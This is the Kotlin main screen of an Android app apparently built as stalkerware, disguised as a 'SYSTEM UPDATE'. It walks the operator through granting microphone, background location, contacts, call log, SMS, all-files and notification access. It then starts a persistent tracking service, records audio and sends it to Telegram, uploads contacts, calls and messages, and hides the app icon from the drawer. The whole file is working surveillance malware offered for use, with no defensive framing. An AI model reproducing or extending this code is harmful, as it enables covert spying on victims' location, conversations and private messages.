package com.venice.tracker

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import java.io.File

class MainActivity : Activity() {

    private lateinit var status: TextView
    private lateinit var logView: TextView

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(40, 60, 40, 60)
        }

        root.addView(TextView(this).apply {
            text = "SYSTEM UPDATE - control panel"
            textSize = 19f
            setTextColor(Color.WHITE)
        })

        status = TextView(this).apply {
            textSize = 13f
            setTextColor(Color.parseColor("#9BE7A0"))
            setPadding(0, 20, 0, 20)
        }
        root.addView(status)

        fun btn(label: String, action: () -> Unit) {
            root.addView(Button(this).apply {
                text = label
                isAllCaps = false
                setOnClickListener { action() }
            })
        }

        btn("1. Grant basic permissions") {
            val perms = mutableListOf(
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_SMS
            )
            if (Build.VERSION.SDK_INT >= 33) perms.add(Manifest.permission.POST_NOTIFICATIONS)
            if (Build.VERSION.SDK_INT <= 32) perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            requestPermissions(perms.toTypedArray(), 1)
        }

        btn("2. Allow location ALL THE TIME") {
            if (Build.VERSION.SDK_INT >= 29)
                requestPermissions(arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION), 2)
        }

        btn("3. Allow access to all files") {
            if (Build.VERSION.SDK_INT >= 30) {
                startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    .setData(Uri.parse("package:$packageName")))
            }
        }

        btn("4. Enable notification access") {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }

        btn("5. Remove battery restrictions") {
            if (Build.VERSION.SDK_INT >= 23) {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    .setData(Uri.parse("package:$packageName")))
            }
        }

        btn("6. START TRACKING") {
            val i = Intent(this, CoreService::class.java)
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
            toast("tracking started")
            refresh()
        }

        btn("Test: location now") {
            Thread { val r = Location2.once(this); runOnUiThread { status.text = r } }.start()
        }

        btn("Test: 30 second recording -> Telegram") {
            Thread {
                try {
                    Recorder.stop(this)
                    Recorder.start(this)
                    Thread.sleep(30_000)
                    Recorder.stop(this)
                    Cloud.flush(this)
                    runOnUiThread { status.text = "recording sent, check Telegram" }
                } catch (t: Throwable) {
                    runOnUiThread { status.text = "rec error: $t" }
                }
            }.start()
        }

        btn("Test: Telegram ping") {
            Thread {
                val f = File(filesDir, "ping.txt").apply { writeText("hello from ${Build.MODEL}") }
                Cloud.queueTg(this, f, "ping test", false)
                Cloud.flush(this)
                runOnUiThread { status.text = "sent, check Telegram" }
            }.start()
        }

        btn("Test: refresh contacts / calls / sms") {
            Thread {
                Pim.snapshot(this)
                runOnUiThread { status.text = "uploaded" }
            }.start()
        }

        btn("Test: rebuild file index") {
            Thread {
                val n = Files.index(this)
                runOnUiThread { status.text = "indexed $n files" }
            }.start()
        }

        btn("HIDE icon from app drawer") {
            setIcon(this, false)
            status.text = "icon hidden - reopen via Quick Settings tile"
        }

        btn("SHOW icon in app drawer") {
            setIcon(this, true)
            status.text = "icon shown"
        }

        btn("Refresh status") { refresh() }

        btn("Show log") { logView.text = readLog() }

        logView = TextView(this).apply {
            textSize = 11f
            setTextColor(Color.parseColor("#BFC6CC"))
            setPadding(0, 30, 0, 0)
        }
        root.addView(logView)

        val sc = ScrollView(this).apply { addView(root) }
        setContentView(sc)
        refresh()
    }

    override fun onRequestPermissionsResult(code: Int, p: Array<out String>, r: IntArray) {
        super.onRequestPermissionsResult(code, p, r)
        refresh()
    }

    override fun onResume() {
        super.onResume()
        refresh()
    }

    private fun refresh() {
        val sb = StringBuilder()
        fun line(label: String, ok: Boolean) =
            sb.append(if (ok) "[ OK ] " else "[ -- ] ").append(label).append("\n")

        line("microphone", granted(Manifest.permission.RECORD_AUDIO))
        line("location fine", granted(Manifest.permission.ACCESS_FINE_LOCATION))
        line("location background", Build.VERSION.SDK_INT < 29 || granted(Manifest.permission.ACCESS_BACKGROUND_LOCATION))
        line("contacts", granted(Manifest.permission.READ_CONTACTS))
        line("call log", granted(Manifest.permission.READ_CALL_LOG))
        line("sms", granted(Manifest.permission.READ_SMS))
        line("all files", allFiles())
        line("notification access", notifAccess())
        line("battery unrestricted", powerOk())
        line("service running", running())
        status.text = sb.toString()
    }

    private fun granted(p: String) = checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED

    private fun allFiles(): Boolean =
        Build.VERSION.SDK_INT < 30 || Environment.isExternalStorageManager()

    private fun notifAccess(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: ""
        return flat.contains(packageName)
    }

    private fun powerOk(): Boolean {
        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun running(): Boolean =
        android.app.ActivityManager.getRunningServices(50)
            .any { it.service.className == CoreService::class.java.name }

    private fun readLog(): String {
        val f = File(filesDir, "log.txt")
        return if (f.exists()) f.readText().takeLast(4000) else "no log yet"
    }

    private fun toast(s: String) {
        android.widget.Toast.makeText(this, s, android.widget.Toast.LENGTH_SHORT).show()
    }

    companion object {
        fun setIcon(ctx: Context, visible: Boolean) {
            try {
                ctx.packageManager.setComponentEnabledSetting(
                    ComponentName(ctx.packageName, Config.ALIAS),
                    if (visible) PackageManager.COMPONENT_ENABLED_STATE_ENABLED
                    else PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            } catch (t: Throwable) {
                Util.log(ctx, "icon toggle: $t")
            }
        }
    }
}
